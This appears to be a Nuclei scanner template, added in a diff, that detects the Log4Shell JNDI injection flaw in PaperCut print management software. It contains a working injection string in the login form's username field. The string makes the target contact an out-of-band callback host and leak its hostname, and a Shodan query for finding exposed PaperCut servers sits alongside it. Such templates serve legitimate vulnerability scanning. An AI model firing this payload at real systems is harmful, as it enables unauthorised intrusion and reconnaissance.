@@ -1,0 +1,67 @@
+id: papercut-log4j-rce
+
+info:
+  name: Papercut - Remote Code Execution (Apache Log4j)
+  author: shaikhyaser
+  severity: critical
+  description: |
+    Papercut is susceptible to Log4j JNDI remote code execution. Papercut is a print management system.
+  reference:
+    - https://www.papercut.com/kb/Main/Log4Shell-CVE-2021-44228#product-status
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+    cpe: cpe:2.3:a:papercut:papercut_mf:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 1
+    shodan-query: title:"Papercut"
+    product: papercut_mf
+    vendor: papercut
+  tags: cve,cve2021,rce,jndi,log4j,papercut,oast,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+  str: "{{rand_base(5)}}"
+
+http:
+  - raw:
+      - |
+        POST /app HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Referer: {{RootURL}}/app
+        Content-Type: application/x-www-form-urlencoded
+
+        service=direct%2F1%2FHome%2F%24Form&sp=S0&Form0=%24Hidden%240%2C%24Hidden%241%2CinputUsername%2CinputPassword%2C%24Submit%240%2C%24PropertySelection&%24Hidden%240=true&%24Hidden%241=X&inputUsername=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&inputPassword=a&%24Submit%240=Log+in&%24PropertySelection=en
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+# digest: 4a0a00473045022100921c616f6112ecbe85a6ca3cf1ca29aee6375b73f71973203c765ac545e492ab02202348603dac123edb10eda49b726a9df79f6bf5f47ba17b7d01e3d6bcf6562479:922c64590222798bb761d5b6d8e72950
